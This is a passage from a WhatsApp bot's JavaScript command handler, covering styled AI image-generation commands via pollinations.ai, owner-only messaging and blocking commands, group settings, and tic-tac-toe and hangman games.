    reply('❌ Failed to generate image. Try a different prompt or try again later.')
  }
}
break

case 'draw2':
case 'imagine2':
case 'art': {
  if (!text) return reply(`🎨 *ZUKO ART STUDIO*\n\nUsage: ${prefix}art <prompt>\n\nExample: ${prefix}art Cyberpunk samurai with neon katana\n\n🎨 Specializing in: Anime, Fantasy, Sci-Fi, Portraits, Landscapes`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎭', key: m.key } })
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🎭 *Creating masterpiece...*\n⏳ Artistic rendering in progress...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(text)}?width=1024&height=1024&nologo=true&enhance=true&seed=${Date.now()}`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🎭 *ZUKO ART STUDIO*\n\n📝 "${text}"\n🎨 Style: AI Artistic\n🖼️ Format: HD Digital Art\n\n✨ *Your exclusive artwork is ready!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Art Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Art generation failed. Please try again.')
  }
}
break

case 'animegen':
case 'animeart':
case 'waifu': {
  if (!text) return reply(`🎌 *ANIME GENERATOR*\n\nUsage: ${prefix}animegen <character description>\n\nExample: ${prefix}animegen Cute anime girl with blue hair and cat ears, school uniform\n\n🎌 Styles: Anime, Manga, Chibi, Kawaii, Shonen, Shojo`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎌', key: m.key } })
  
  const prompt = `anime style, anime art, manga style, ${text}, anime character, high quality anime illustration, vibrant colors, detailed eyes, beautiful shading, trending on pixiv`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🎌 *Drawing anime character...*\n⏳ Kawaii level: maximum!' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🎌 *ZUKO ANIME STUDIO*\n\n📝 ${text}\n🎨 Style: Anime/Manga\n✨ Quality: 4K Ultra HD\n\n🌸 *Kawaii desu! Your anime character is ready!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🌸', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Anime Gen Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Anime generation failed. Try again!')
  }
}
break

case 'realistic':
case 'photoreal':
case 'photo': {
  if (!text) return reply(`📸 *PHOTOREALISTIC GENERATOR*\n\nUsage: ${prefix}realistic <description>\n\nExample: ${prefix}realistic A professional portrait of a businessman, studio lighting, 8k, photorealistic`)
  
  await empire.sendMessage(m.chat, { react: { text: '📸', key: m.key } })
  
  const prompt = `photorealistic, real photo, ${text}, 8k, high resolution, detailed texture, natural lighting, professional photography, cinema lighting, ultra hd`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '📸 *Rendering photorealistic image...*\n⏳ Aiming for maximum realism...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `📸 *ZUKO PHOTOREAL*\n\n📝 ${text}\n🎭 Style: Photorealistic\n🔍 Resolution: 8K Ultra HD\n\n📷 *Looks like a real photo!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '📷', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Realistic Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Photorealistic generation failed.')
  }
}
break

case 'cyberpunk':
case 'cyber':
case 'futuristic': {
  if (!text) return reply(`🤖 *CYBERPUNK GENERATOR*\n\nUsage: ${prefix}cyberpunk <description>\n\nExample: ${prefix}cyberpunk Neon samurai in rain-soaked Tokyo street, purple and blue neon lights`)
  
  await empire.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
  
  const prompt = `cyberpunk style, futuristic, neon lights, dark atmosphere, ${text}, digital art, synthwave, outrun aesthetic, glowing elements, detailed, 4k`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🤖 *Entering the cyberpunk dimension...*\n⏳ Generating neon-drenched future...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🤖 *ZUKO CYBERPUNK*\n\n📝 ${text}\n🎭 Theme: Cyberpunk/Futuristic\n💫 Neon Level: Maximum\n\n⚡ *Welcome to the future!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '⚡', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Cyberpunk Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Cyberpunk generation failed.')
  }
}
break

case 'fantasy':
case 'fantasyart':
case 'dnd': {
  if (!text) return reply(`🐉 *FANTASY ART GENERATOR*\n\nUsage: ${prefix}fantasy <description>\n\nExample: ${prefix}fantasy Epic dragon flying over medieval castle, magic spells, dramatic sky, fantasy art`)
  
  await empire.sendMessage(m.chat, { react: { text: '🐉', key: m.key } })
  
  const prompt = `fantasy art, epic fantasy, ${text}, magic, mythical creatures, dramatic lighting, detailed, trending on artstation, concept art, high quality, 4k`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🐉 *Casting magic spell...*\n⏳ Summoning fantasy creatures...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🐉 *ZUKO FANTASY REALM*\n\n📝 ${text}\n🎭 Genre: Epic Fantasy\n🗡️ Power Level: Legendary\n\n🌟 *Your fantasy world awaits!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🌟', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Fantasy Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Fantasy art generation failed.')
  }
}
break

case 'portrait':
case 'character':
case 'person': {
  if (!text) return reply(`👤 *PORTRAIT GENERATOR*\n\nUsage: ${prefix}portrait <description>\n\nExample: ${prefix}portrait A young wizard with glowing blue eyes, detailed face, cinematic lighting`)
  
  await empire.sendMessage(m.chat, { react: { text: '👤', key: m.key } })
  
  const prompt = `portrait art, detailed face, ${text}, character design, beautiful lighting, professional portrait, high quality, 4k, digital painting`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '👤 *Creating character portrait...*\n⏳ Adding life to your character...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `👤 *ZUKO PORTRAIT STUDIO*\n\n📝 ${text}\n🎭 Type: Character Portrait\n✨ Detail Level: Ultra-High\n\n👑 *Your character comes to life!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '👑', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Portrait Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Portrait generation failed.')
  }
}
break

case 'landscape':
case 'scenery':
case 'view': {
  if (!text) return reply(`🏔️ *LANDSCAPE GENERATOR*\n\nUsage: ${prefix}landscape <description>\n\nExample: ${prefix}landscape Mystical forest with glowing mushrooms, magical atmosphere, sunrise`)
  
  await empire.sendMessage(m.chat, { react: { text: '🏔️', key: m.key } })
  
  const prompt = `beautiful landscape, ${text}, scenic view, nature, detailed environment, beautiful lighting, 4k, high resolution, wide angle, masterpiece`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: "🏔️ *Painting your landscape...*\n⏳ Adding nature's beauty..." }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🏔️ *ZUKO LANDSCAPES*\n\n📝 ${text}\n🎨 Style: Environmental Art\n🌅 Atmosphere: Breathtaking\n\n🌄 *Your scenic view is ready!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🌄', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Landscape Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Landscape generation failed.')
  }
}
break

case 'logo':
case 'logodesign':
case 'brand': {
  if (!text) return reply(`🏷️ *LOGO GENERATOR*\n\nUsage: ${prefix}logo <brand/company name>\n\nExample: ${prefix}logo Tech startup with rocket symbol, modern minimalist design\n\n📐 Styles: Minimalist, Modern, Vintage, Luxury, Tech, Creative, Abstract`)
  
  await empire.sendMessage(m.chat, { react: { text: '🏷️', key: m.key } })
  
  const prompt = `professional logo design, ${text}, sleek, minimalist, vector style, white background, corporate identity, brand logo, clean design, high quality`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🏷️ *Designing your logo...*\n⏳ Creating brand identity...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🏷️ *ZUKO LOGO STUDIO*\n\n📝 ${text}\n🎨 Design: Professional Logo\n💎 Format: Vector-Style\n\n⭐ *Your brand identity is ready!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '⭐', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Logo Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Logo generation failed.')
  }
}
break

case 'hd':
case 'ultrahd':
case '4k': {
  if (!text) return reply(`🎬 *ULTRA HD GENERATOR*\n\nUsage: ${prefix}4k <prompt>\n\nExample: ${prefix}4k Beautiful mountain landscape, golden hour, professional photography\n\n🎬 Resolution: 4K Ultra HD | 8K Available`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎬', key: m.key } })
  
  const prompt = `${text}, 4k, 8k, ultra high definition, detailed, sharp focus, high resolution, masterpiece, professional photography`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🎬 *Rendering in Ultra HD...*\n⏳ Maximum quality processing...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1920&height=1080&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🎬 *ZUKO ULTRA HD*\n\n📝 ${text}\n📐 Resolution: 1920x1080 (HD)\n🎯 Quality: Ultra High Definition\n\n✨ *Crystal clear masterpiece!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '✨', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('HD Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ HD generation failed.')
  }
}
break

case 'vertical':
case 'phone':
case 'mobile': {
  if (!text) return reply(`📱 *MOBILE WALLPAPER GENERATOR*\n\nUsage: ${prefix}mobile <prompt>\n\nExample: ${prefix}mobile Abstract art with vibrant colors, perfect for phone wallpaper\n\n📱 Resolution: 1080x1920 (Perfect for phones)`)
  
  await empire.sendMessage(m.chat, { react: { text: '📱', key: m.key } })
  
  const prompt = `${text}, vertical orientation, phone wallpaper, mobile background, high quality, vibrant colors`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '📱 *Creating mobile wallpaper...*\n⏳ Optimizing for your phone...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1080&height=1920&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `📱 *ZUKO MOBILE WALLPAPER*\n\n📝 ${text}\n📐 Resolution: 1080x1920\n📱 Optimized for: All Phones\n\n🌟 *Perfect wallpaper for your device!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🌟', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Mobile Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Mobile wallpaper generation failed.')
  }
}
break

case 'watercolor':
case 'watercolour': {
  if (!text) return reply(`🎨 *WATERCOLOR GENERATOR*\n\nUsage: ${prefix}watercolor <prompt>\n\nExample: ${prefix}watercolor Peaceful garden with flowers, artistic watercolor style`)
  
  await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
  
  const prompt = `watercolor painting, ${text}, artistic, soft colors, paint strokes, beautiful artwork, traditional art style, high quality watercolor`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🎨 *Painting with watercolors...*\n⏳ Adding artistic touch...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🎨 *ZUKO WATERCOLOR STUDIO*\n\n📝 ${text}\n🎭 Medium: Watercolor on Canvas\n✨ Style: Traditional Art\n\n🖌️ *A beautiful watercolor masterpiece!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🖌️', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Watercolor Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Watercolor generation failed.')
  }
}
break

case 'oilpainting':
case 'oilart': {
  if (!text) return reply(`🖼️ *OIL PAINTING GENERATOR*\n\nUsage: ${prefix}oilpainting <prompt>\n\nExample: ${prefix}oilpainting Classical portrait of noblewoman, renaissance style`)
  
  await empire.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
  
  const prompt = `oil painting, ${text}, canvas texture, brush strokes, classical art, museum quality, rich colors, detailed painting, renaissance style`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '🖼️ *Creating oil painting...*\n⏳ Adding canvas texture...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `🖼️ *ZUKO OIL PAINTING*\n\n📝 ${text}\n🎭 Medium: Oil on Canvas\n🎨 Style: Classical Art\n\n🖼️ *Gallery-quality masterpiece!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Oil Painting Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Oil painting generation failed.')
  }
}
break

case 'pixelart':
case 'pixel': {
  if (!text) return reply(`👾 *PIXEL ART GENERATOR*\n\nUsage: ${prefix}pixelart <prompt>\n\nExample: ${prefix}pixelart Retro game character, 16-bit style, cute, pixelated`)
  
  await empire.sendMessage(m.chat, { react: { text: '👾', key: m.key } })
  
  const prompt = `pixel art, ${text}, retro game style, 16-bit, pixelated, vibrant colors, game sprite, nostalgic, detailed pixels`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '👾 *Creating pixel art...*\n⏳ Making every pixel count...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=512&height=512&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `👾 *ZUKO PIXEL STUDIO*\n\n📝 ${text}\n🎮 Style: Pixel Art (16-bit)\n✨ Resolution: Retro Quality\n\n🎮 *Nostalgic pixel perfection!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '🎮', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Pixel Art Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Pixel art generation failed.')
  }
}
break

case 'sketch':
case 'drawing':
case 'pencil': {
  if (!text) return reply(`✏️ *PENCIL SKETCH GENERATOR*\n\nUsage: ${prefix}sketch <prompt>\n\nExample: ${prefix}sketch Beautiful woman portrait, pencil drawing, detailed shading`)
  
  await empire.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
  
  const prompt = `pencil sketch, ${text}, detailed drawing, shading, monochrome, artistic sketch, hand-drawn, graphite art, high quality sketch`
  
  const waitMsg = await empire.sendMessage(m.chat, { text: '✏️ *Sketching your drawing...*\n⏳ Adding detailed shading...' }, { quoted: m })
  
  try {
    const response = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&enhance=true`)
    
    await empire.sendMessage(m.chat, {
      image: { url: response.config.url },
      caption: `✏️ *ZUKO SKETCH STUDIO*\n\n📝 ${text}\n✏️ Medium: Pencil on Paper\n🎨 Style: Hand-Drawn Sketch\n\n📝 *Your beautiful sketch is ready!*`
    }, { quoted: m })
    
    await empire.sendMessage(m.chat, { react: { text: '📝', key: m.key } })
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
  } catch (err) {
    console.error('Sketch Error:', err)
    await empire.sendMessage(m.chat, { delete: waitMsg.key })
    reply('❌ Sketch generation failed.')
  }
}
break
case 'groupencrypt':
case 'encryptchat': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`🔐 Usage: ${prefix}groupencrypt on/off\n\nEnables end-to-end encryption enforcement.`)
  }
  
  setSetting(m.chat, 'encrypt', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} encryption enforcement.`)
}
break

case 'grouparchive':
case 'archivegroup': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.archivedGroups) db.archivedGroups = []
  
  if (db.archivedGroups.includes(m.chat)) {
    db.archivedGroups = db.archivedGroups.filter(id => id !== m.chat)
    reply('✅ Group removed from archive.')
  } else {
    db.archivedGroups.push(m.chat)
    reply('📦 Group added to archive. Bot will ignore messages from this group.')
  }
  
  saveDB()
}
break
// ==================== PRIVATE CHAT COMMANDS ====================

case 'dm':
case 'privatesend': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let message = text.replace(args[0], '').trim()
  
  if (!target || !message) {
    return reply(`📝 Usage: ${prefix}dm @user <message>\nExample: ${prefix}dm @user Hello there!`)
  }
  
  try {
    await empire.sendMessage(target, { text: message })
    reply(`✅ Message sent to @${target.split('@')[0]}`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to send message. User may have blocked the bot.')
  }
}
break

case 'dmmedia':
case 'sendmedia': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`📝 Usage: ${prefix}sendmedia @user (reply to media)\n\nReply to an image/video with this command.`)
  }
  
  if (!m.quoted) {
    return reply('❌ Reply to a media message to forward.')
  }
  
  try {
    await empire.sendMessage(target, { forward: m.quoted.key })
    reply(`✅ Media sent to @${target.split('@')[0]}`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to send media.')
  }
}
break

case 'dmall':
case 'broadcastdm': {
  if (!isCreator) return reply('❌ Owner only')
  
  const message = text
  if (!message) return reply(`📝 Usage: ${prefix}broadcastdm <message>\n\nSends message to all private chats.`)
  
  const chats = store.chats
  let sent = 0
  let failed = 0
  
  reply(`⏳ Broadcasting to private chats...`)
  
  for (const [jid, chat] of Object.entries(chats)) {
    if (jid.endsWith('@s.whatsapp.net') && !jid.includes(botNumber)) {
      try {
        await empire.sendMessage(jid, { text: message })
        sent++
        await sleep(1000)
      } catch (err) {
        failed++
      }
    }
  }
  
  reply(`✅ Broadcast complete!\n📤 Sent: ${sent}\n❌ Failed: ${failed}`)
}
break

case 'block':
case 'blockuser': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`🚫 Usage: ${prefix}block @user\n\nBlocks a user from contacting the bot.`)
  }
  
  try {
    await empire.updateBlockStatus(target, 'block')
    reply(`✅ @${target.split('@')[0]} has been blocked.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to block user.')
  }
}
break

case 'unblock':
case 'unblockuser': {
  if (!isCreator) return reply('❌ Owner only')
  
  let target = m.mentionedJid[0] || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  
  if (!target) {
    return reply(`🔓 Usage: ${prefix}unblock @user\n\nUnblocks a user.`)
  }
  
  try {
    await empire.updateBlockStatus(target, 'unblock')
    reply(`✅ @${target.split('@')[0]} has been unblocked.`, { mentions: [target] })
  } catch (err) {
    reply('❌ Failed to unblock user.')
  }
}
break
case 'tictactoe':
case 'ttt': {
  if (!m.isGroup) return reply('❌ Play games in groups only!')
  
  const args2 = text.split(' ')
  const action = args2[0]?.toLowerCase()
  
  // Start new game
  if (!action || action === 'start') {
    let opponent = m.mentionedJid[0]
    if (!opponent) return reply(`🎮 *TIC TAC TOE*\n\nUsage: ${prefix}ttt start @opponent\n\nStart a game with another member.`)
    
    if (opponent === m.sender) return reply('❌ You cannot play against yourself!')
    
    const gameId = m.chat
    if (activeGames.tictactoe[gameId]) return reply('⚠️ A game is already in progress! Finish it first.')
    
    activeGames.tictactoe[gameId] = {
      board: Array(9).fill(null),
      players: [m.sender, opponent],
      turn: m.sender,
      winner: null,
      moves: 0
    }
    
    const boardDisplay = displayTicTacToe(activeGames.tictactoe[gameId].board)
    
    await empire.sendMessage(m.chat, {
      text: `🎮 *TIC TAC TOE STARTED!*\n\n${boardDisplay}\n\n👑 Turn: @${m.sender.split('@')[0]} (❌)\n👤 Opponent: @${opponent.split('@')[0]} (⭕)\n\nUse: ${prefix}ttt place <1-9>`,
      mentions: [m.sender, opponent]
    }, { quoted: m })
  }
  
  // Make a move
  else if (action === 'place') {
    const position = parseInt(args2[1]) - 1
    const gameId = m.chat
    const game = activeGames.tictactoe[gameId]
    
    if (!game) return reply('🎮 No active game! Start one with: .ttt start @opponent')
    if (game.winner) return reply('🎮 Game already finished! Start a new one.')
    if (game.turn !== m.sender) return reply('❌ Wait for your turn!')
    if (position < 0 || position > 8 || isNaN(position)) return reply('❌ Invalid position! Use 1-9.')
    if (game.board[position] !== null) return reply('❌ That spot is already taken!')
    
    const symbol = game.turn === game.players[0] ? '❌' : '⭕'
    game.board[position] = symbol
    game.moves++
    
    const winner = checkTicTacToeWinner(game.board)
    
    if (winner) {
      game.winner = game.turn
      const boardDisplay = displayTicTacToe(game.board)
      await empire.sendMessage(m.chat, {
        text: `🎉 *GAME OVER!*\n\n${boardDisplay}\n\n🏆 Winner: @${game.turn.split('@')[0]}!\n\nType: ${prefix}ttt start @opponent to play again!`,
        mentions: [game.turn]
      }, { quoted: m })
      delete activeGames.tictactoe[gameId]
    } 
    else if (game.moves === 9) {
      const boardDisplay = displayTicTacToe(game.board)
      await empire.sendMessage(m.chat, {
        text: `🤝 *GAME OVER - TIE!*\n\n${boardDisplay}\n\nIt\'s a draw!\n\nType: ${prefix}ttt start @opponent to play again!`
      }, { quoted: m })
      delete activeGames.tictactoe[gameId]
    }
    else {
      game.turn = game.turn === game.players[0] ? game.players[1] : game.players[0]
      const nextSymbol = game.turn === game.players[0] ? '❌' : '⭕'
      const boardDisplay = displayTicTacToe(game.board)
      
      await empire.sendMessage(m.chat, {
        text: `🎮 *MOVE PLACED!*\n\n${boardDisplay}\n\n👑 Turn: @${game.turn.split('@')[0]} (${nextSymbol})\n\nUse: ${prefix}ttt place <1-9>`,
        mentions: [game.turn]
      }, { quoted: m })
    }
  }
  
  // Reset game
  else if (action === 'reset') {
    const gameId = m.chat
    if (activeGames.tictactoe[gameId]) {
      delete activeGames.tictactoe[gameId]
      reply('✅ Game reset! Start a new one with: .ttt start @opponent')
    } else {
      reply('❌ No active game to reset.')
    }
  }
  
  else {
    reply(`🎮 *TIC TAC TOE COMMANDS*\n\n${prefix}ttt start @opponent - Start new game\n${prefix}ttt place <1-9> - Make a move\n${prefix}ttt reset - Reset current game`)
  }
}
break

function displayTicTacToe(board) {
  const symbols = board.map(cell => cell || '⚪')
  return `
┌───┬───┬───┐
│ ${symbols[0]} │ ${symbols[1]} │ ${symbols[2]} │
├───┼───┼───┤
│ ${symbols[3]} │ ${symbols[4]} │ ${symbols[5]} │
├───┼───┼───┤
│ ${symbols[6]} │ ${symbols[7]} │ ${symbols[8]} │
└───┴───┴───┘
  `.trim()
}

case 'hangman':
case 'hm': {
  const words = [
    'PYTHON', 'JAVASCRIPT', 'WHATSAPP', 'BOT', 'PROGRAMMING',
    'DEVELOPER', 'COMPUTER', 'INTERNET', 'SOFTWARE', 'HARDWARE',
    'ZUKO', 'XMD', 'AKIRA', 'EMPIRE', 'TECHNOLOGY'
  ]
  
  if (text === 'reset') {
    const gameId = m.chat
    if (activeGames.hangman[gameId]) {
      delete activeGames.hangman[gameId]
      reply('✅ Hangman game reset!')
    } else {
      reply('❌ No active game to reset.')
    }
    return
  }
  
  let game = activeGames.hangman[m.chat]
  
  // Start new game
  if (!game) {
    const randomWord = words[Math.floor(Math.random() * words.length)]
    game = {
      word: randomWord,
      guessed: [],
      attempts: 6,
      display: '_'.repeat(randomWord.length).split('')
    }
    activeGames.hangman[m.chat] = game
    
    const displayWord = game.display.join(' ')
    const hangmanArt = getHangmanArt(game.attempts)
    
    await empire.sendMessage(m.chat, {
      text: `🎮 *HANGMAN GAME STARTED!*\n\n${hangmanArt}\n\n📝 Word: ${displayWord}\n❤️ Attempts: ${game.attempts}\n\nGuess a letter: ${prefix}hm <letter>\nOr guess the word: ${prefix}hm guess <word>`
    }, { quoted: m })
    return
  }
  
  // Process guess
  const guess = text.toUpperCase()
  
  if (guess === 'guess') {
    return reply(`📝 Usage: ${prefix}hm guess <full word>`)
  }
  
  if (guess.startsWith('GUESS ')) {
    const wordGuess = guess.substring(6)
    if (wordGuess === game.word) {
      await empire.sendMessage(m.chat, {
        text: `🎉 *CORRECT!* You guessed the word: ${game.word}\n\n🏆 You win! 🏆\n\nStart a new game with: ${prefix}hm`
      }, { quoted: m })
      delete activeGames.hangman[m.chat]
    } else {
      game.attempts -= 2
      const hangmanArt = getHangmanArt(game.attempts)
      
      if (game.attempts <= 0) {
        await empire.sendMessage(m.chat, {
          text: `💀 *GAME OVER!*\n\nWord was: ${game.word}\n\nBetter luck next time!\n\nStart a new game with: ${prefix}hm`,
          mentions: [m.sender]
        }, { quoted: m })
        delete activeGames.hangman[m.chat]
      } else {
        await empire.sendMessage(m.chat, {
          text: `❌ Wrong guess!\n\n${hangmanArt}\n\n❤️ Attempts left: ${game.attempts}\n\nKeep trying!`
        }, { quoted: m })
      }
    }
    return
  }
  
  // Single letter guess
  if (guess.length !== 1 || !guess.match(/[A-Z]/)) {
    return reply('❌ Please guess a single letter (A-Z) or use: guess <word>')
  }
  
  if (game.guessed.includes(guess)) {
    return reply(`⚠️ You already guessed "${guess}"! Try another letter.`)
  }
  
  game.guessed.push(guess)
  
  if (game.word.includes(guess)) {
    // Update display
    for (let i = 0; i < game.word.length; i++) {
      if (game.word[i] === guess) {
        game.display[i] = guess
      }
    }
    
    const displayWord = game.display.join(' ')
    const hangmanArt = getHangmanArt(game.attempts)
    
    if (!game.display.includes('_')) {
      await empire.sendMessage(m.chat, {
        text: `🎉 *VICTORY!*\n\nWord: ${game.word}\n\n🏆 Congratulations! You win! 🏆\n\nStart a new game with: ${prefix}hm`
      }, { quoted: m })
      delete activeGames.hangman[m.chat]
    } else {
      await empire.sendMessage(m.chat, {
        text: `✅ Good guess!\n\n${hangmanArt}\n\n📝 Word: ${displayWord}\n❤️ Attempts: ${game.attempts}\n💡 Guessed: ${game.guessed.join(', ')}`
      }, { quoted: m })
    }
  } else {
    game.attempts--
    const hangmanArt = getHangmanArt(game.attempts)
    const displayWord = game.display.join(' ')
    
    if (game.attempts <= 0) {
      await empire.sendMessage(m.chat, {
        text: `💀 *GAME OVER!*\n\n${hangmanArt}\nWord was: ${game.word}\n\nBetter luck next time!\n\nStart a new game with: ${prefix}hm`
      }, { quoted: m })
      delete activeGames.hangman[m.chat]
    } else {
      await empire.sendMessage(m.chat, {
        text: `❌ Wrong! "${guess}" is not in the word.\n\n${hangmanArt}\n\n📝 Word: ${displayWord}\n❤️ Attempts: ${game.attempts}\n💡 Guessed: ${game.guessed.join(', ')}`
      }, { quoted: m })
    }
  }
}
break

function getHangmanArt(attempts) {
